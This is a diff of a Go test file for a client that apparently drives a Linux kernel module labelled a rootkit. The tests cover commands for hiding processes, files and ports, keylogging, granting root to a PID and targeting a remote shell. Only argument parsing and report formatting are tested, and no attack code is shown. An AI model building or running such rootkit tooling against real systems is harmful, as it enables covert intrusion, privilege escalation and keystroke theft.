@@ -3,7 +3,10 @@ package main
 import (
 	"bytes"
 	"encoding/json"
+	"errors"
+	"fmt"
 	"os"
+	"runtime"
 	"strings"
 	"testing"
 
@@ -15,7 +18,7 @@ import (
 func TestMarshalStatsJSON(t *testing.T) {
 	raw := map[string]string{
 		"module":          "vault_kernel",
-		"version":         "3.11",
+		"version":         "3.12",
 		"hooks_installed": "7",
 		"hooks_planned":   "7",
 		"module_hidden":   "0",
@@ -43,7 +46,7 @@ func TestMarshalStatsJSON(t *testing.T) {
 			t.Errorf("%s should marshal as a number, got %T (%v)", k, out[k], out[k])
 		}
 	}
-	if out["module"] != "vault_kernel" || out["version"] != "3.11" {
+	if out["module"] != "vault_kernel" || out["version"] != "3.12" {
 		t.Errorf("string values mangled: module=%v version=%v", out["module"], out["version"])
 	}
 }
@@ -523,7 +526,7 @@ func TestKeylogSink(t *testing.T) {
 func TestBuildCaptureReport(t *testing.T) {
 	raw := map[string]string{
 		"module":          "vault_kernel",
-		"version":         "3.11",
+		"version":         "3.12",
 		"hooks_installed": "7",
 		"hooks_planned":   "7",
 		"module_hidden":   "0",
@@ -538,7 +541,8 @@ func TestBuildCaptureReport(t *testing.T) {
 		Files: []string{"secret.txt"},
 		Ports: []int{8080},
 	}
-	rep := buildCaptureReport(raw, hidden, "hello", "2026-09-15T10:30:05Z", false, clientVersion)
+	rep := buildCaptureReport(raw, hidden, "hello", "2026-09-15T10:30:05Z", false, clientVersion,
+		"lab-host", "6.8.0-45-generic")
 
 	if rep.Schema != jsonSchemaVersion {
 		t.Errorf("schema = %d, want %d", rep.Schema, jsonSchemaVersion)
@@ -546,10 +550,14 @@ func TestBuildCaptureReport(t *testing.T) {
 	if rep.CapturedAt != "2026-09-15T10:30:05Z" || rep.ClientVersion != clientVersion {
 		t.Errorf("envelope scalars mangled: %q %q", rep.CapturedAt, rep.ClientVersion)
 	}
+	// v3.12: host context travels with the bundle.
+	if rep.Hostname != "lab-host" || rep.KernelRelease != "6.8.0-45-generic" {
+		t.Errorf("host context mangled: %q %q", rep.Hostname, rep.KernelRelease)
+	}
 	if rep.ModuleInSysfs {
 		t.Errorf("module_in_sysfs = true, want false")
 	}
-	if rep.Stats["hooks_installed"].(int) != 7 || rep.Stats["version"] != "3.11" {
+	if rep.Stats["hooks_installed"].(int) != 7 || rep.Stats["version"] != "3.12" {
 		t.Errorf("stats conversion wrong: %v", rep.Stats)
 	}
 	if len(rep.Hidden.PIDs) != 1 || rep.Hidden.Files[0] != "secret.txt" {
@@ -565,7 +573,7 @@ func TestBuildCaptureReport(t *testing.T) {
 		t.Fatalf("marshal: %v", err)
 	}
 	order := []string{`"schema"`, `"captured_at"`, `"client_version"`,
-		`"module_in_sysfs"`, `"stats"`, `"hidden"`, `"keylog"`}
+		`"hostname"`, `"kernel_release"`, `"module_in_sysfs"`, `"stats"`, `"hidden"`, `"keylog"`}
 	pos := 0
 	for _, k := range order {
 		idx := strings.Index(string(j)[pos:], k)
@@ -772,7 +780,7 @@ func TestParseWatchArgsOnce(t *testing.T) {
 func TestParseModinfo(t *testing.T) {
 	out := "filename:       /lib/modules/6.1.0/vault_kernel.ko\n" +
 		"srcversion:     ABC123\n" +
-		"version:        3.11\n" +
+		"version:        3.12\n" +
 		"author:         ruby570bocadito\n" +
 		"description:    vault_kernel kernel rootkit\n" +
 		"license:        GPL\n"
@@ -781,7 +789,7 @@ func TestParseModinfo(t *testing.T) {
 		t.Fatalf("parseModinfo returned nil for a complete output")
 	}
 	if mi.Filename != "/lib/modules/6.1.0/vault_kernel.ko" ||
-		mi.Version != "3.11" || mi.Author != "ruby570bocadito" ||
+		mi.Version != "3.12" || mi.Author != "ruby570bocadito" ||
 		mi.Description != "vault_kernel kernel rootkit" {
 		t.Errorf("fields mangled: %+v", mi)
 	}
@@ -795,8 +803,8 @@ func TestParseModinfo(t *testing.T) {
 	}
 
 	// Subset: only version present.
-	mi = parseModinfo("version:  3.11\nlicense: GPL\n")
-	if mi == nil || mi.Version != "3.11" || mi.Author != "" {
+	mi = parseModinfo("version:  3.12\nlicense: GPL\n")
+	if mi == nil || mi.Version != "3.12" || mi.Author != "" {
 		t.Errorf("subset parse: %+v (want version only)", mi)
 	}
 
@@ -809,8 +817,8 @@ func TestParseModinfo(t *testing.T) {
 	}
 
 	// Empty value for a contract key is skipped; first occurrence wins.
-	mi = parseModinfo("version:\nversion: 3.11\n")
-	if mi == nil || mi.Version != "3.11" {
+	mi = parseModinfo("version:\nversion: 3.12\n")
+	if mi == nil || mi.Version != "3.12" {
 		t.Errorf("empty-value handling: %+v", mi)
 	}
 }
@@ -819,7 +827,7 @@ func TestParseModinfo(t *testing.T) {
 // module_in_sysfs always present, modinfo omitted (omitempty) when the
 // modinfo probe did not run or found nothing.
 func TestBuildStatusReport(t *testing.T) {
-	mi := &modinfoInfo{Filename: "/x/vault_kernel.ko", Version: "3.11"}
+	mi := &modinfoInfo{Filename: "/x/vault_kernel.ko", Version: "3.12"}
 	rep := buildStatusReport(true, false, mi)
 	if rep.Schema != jsonSchemaVersion || !rep.DevicePresent || rep.ModuleInSysfs {
 		t.Errorf("scalar fields wrong: %+v", rep)
@@ -968,5 +976,117 @@ func TestFlagValuesRejectLeadingDash(t *testing.T) {
 	opts, err = parseKeylogArgs([]string{"--output", "./-foo"})
 	if err != nil || opts.outputPath != "./-foo" {
 		t.Errorf("./- escape mangled: %+v, %v", opts, err)
+	}
+}
+
+// v3.12: the --count grammar of `watch` — finite frame windows,
+// >= 1, at most once, mutually exclusive with --once (one frame is
+// not a window).
+func TestParseWatchArgsCount(t *testing.T) {
+	opts, err := parseWatchArgs([]string{"--count", "5"})
+	if err != nil || opts.count != 5 || opts.once {
+		t.Fatalf("--count 5 = %+v, %v", opts, err)
+	}
+	// Combined with --interval, either order.
+	opts, err = parseWatchArgs([]string{"--interval", "250", "--count", "1"})
+	if err != nil || opts.count != 1 || opts.intervalMs != 250 {
+		t.Fatalf("interval+count = %+v, %v", opts, err)
+	}
+	opts, err = parseWatchArgs([]string{"--count", "2", "--interval", "900"})
+	if err != nil || opts.count != 2 || opts.intervalMs != 900 {
+		t.Fatalf("count+interval = %+v, %v", opts, err)
+	}
+	// Defaults stay untouched.
+	opts, err = parseWatchArgs(nil)
+	if err != nil || opts.count != 0 || opts.once || opts.intervalMs != watchDefaultIntervalMs {
+		t.Fatalf("bare watch = %+v, %v", opts, err)
+	}
+	for _, bad := range [][]string{
+		{"--count"},                      // missing operand
+		{"--count", "0"},                 // < 1
+		{"--count", "-3"},                // negative
+		{"--count", "abc"},               // garbage
+		{"--count", "2", "--count", "3"}, // duplicate
+		{"--count", "2", "--once"},       // mutually exclusive
+	} {
+		_, err := parseWatchArgs(bad)
+		if err == nil {
+			t.Errorf("parseWatchArgs(%v) = nil error, want usage error", bad)
+			continue
+		}
+		var ue *usageError
+		if !errors.As(err, &ue) {
+			t.Errorf("parseWatchArgs(%v) error not usageError: %v", bad, err)
+		}
+	}
+}
+
+// v3.12: the whole grammar layer returns *usageError — the exit-code
+// contract maps usage to 2 and runtime to 1, so the CLASS of every
+// grammar error is contractual.  Plain errors stay runtime.
+func TestGrammarErrorsAreUsage(t *testing.T) {
+	mk := func(name string, fn func() error) struct {
+		name string
+		err  error
+	} {
+		return struct {
+			name string
+			err  error
+		}{name, fn()}
+	}
+	cases := []struct {
+		name string
+		err  error
+	}{
+		mk("strictArgs extra", func() error { return strictArgs([]string{"a", "b"}, 1, "usage: x") }),
+		mk("strictArgs missing", func() error { return strictArgs(nil, 1, "usage: x") }),
+		mk("posix dash", func() error { _, err := posixOperandArgs([]string{"-foo"}); return err }),
+		mk("posix plain", func() error { _, err := posixOperandArgs([]string{"ok"}); return err }),
+		mk("give-root garbage pid", func() error { _, err := parseGiveRootPID([]string{"abc"}); return err }),
+		mk("pid zero", func() error { _, err := parsePIDArg("0"); return err }),
+		mk("port zero", func() error { _, err := parsePortArg("0"); return err }),
+		mk("shell two colons", func() error { return parseShellTarget("abc:def:80") }),
+		mk("shell long", func() error { return parseShellTarget(strings.Repeat("a", 300) + ":80") }),
+		mk("keylog dangling stop-after", func() error { _, err := parseKeylogArgs([]string{"--stop-after"}); return err }),
+		mk("capture dangling out", func() error { _, _, err := parseCaptureArgs([]string{"--out"}); return err }),
+		mk("watch extra", func() error { _, err := parseWatchArgs([]string{"extra"}); return err }),
+		mk("watch count zero", func() error { _, err := parseWatchArgs([]string{"--count", "0"}); return err }),
+		mk("magic-encode one operand", func() error { _, _, err := parseMagicEncodeArgs([]string{"pwn"}); return err }),
+		mk("empty file name", func() error { return validateFileName("") }),
+		mk("long file name", func() error { return validateFileName(strings.Repeat("a", 256)) }),
+		mk("empty magic word", func() error { return validateMagicWord("") }),
+		mk("long magic word", func() error { return validateMagicWord(strings.Repeat("a", 16)) }),
+	}
+	for _, c := range cases {
+		if c.name == "posix plain" {
+			if c.err != nil {
+				t.Errorf("%s: plain operand must pass, got %v", c.name, c.err)
+			}
+			continue
+		}
+		if c.err == nil {
+			t.Errorf("%s: nil error, want usage error", c.name)
+			continue
+		}
+		var ue *usageError
+		if !errors.As(c.err, &ue) {
+			t.Errorf("%s: error %v is NOT usageError", c.name, c.err)
+		}
+	}
+	// The runtime class stays plain.
+	var ue *usageError
+	if errors.As(fmt.Errorf("plain runtime failure"), &ue) {
+		t.Error("plain error must NOT match usageError")
+	}
+}
+
+// v3.12: the host-context collector of the capture bundle.
+func TestRunningKernelRelease(t *testing.T) {
+	rel := runningKernelRelease()
+	if runtime.GOOS != "linux" || rel == "" {
+		t.Skipf("procfs unavailable (GOOS=%s, rel=%q)", runtime.GOOS, rel)
+	}
+	if strings.ContainsAny(rel, " \n\t") {
+		t.Errorf("kernel release carries whitespace: %q", rel)
 	}
 }
